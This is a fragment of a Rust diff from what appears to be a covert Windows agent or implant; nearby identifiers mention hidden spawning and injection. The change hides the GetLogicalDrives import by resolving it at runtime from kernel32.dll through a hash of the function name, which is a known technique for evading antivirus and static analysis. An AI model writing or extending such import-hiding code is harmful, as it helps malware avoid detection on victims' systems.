@@ -234,7 +234,14 @@ pub(super) fn spawn_hidden(binary: &str, args_json: &str) -> String {
 
 #[cfg(target_os = "windows")]
 fn enumerate_drives() -> String {
-    extern "system" { fn GetLogicalDrives() -> u32; }
+    // Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn GetLogicalDrives() -> u32 {
+        type F = unsafe extern "system" fn() -> u32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(|| crate::agent::injection::win_resolve::resolve_ptr(b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetLogicalDrives")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f() }
+    }
     let mask = unsafe { GetLogicalDrives() };
     let entries: Vec<serde_json::Value> = (0..26u32)
         .filter(|i| mask & (1 << i) != 0)
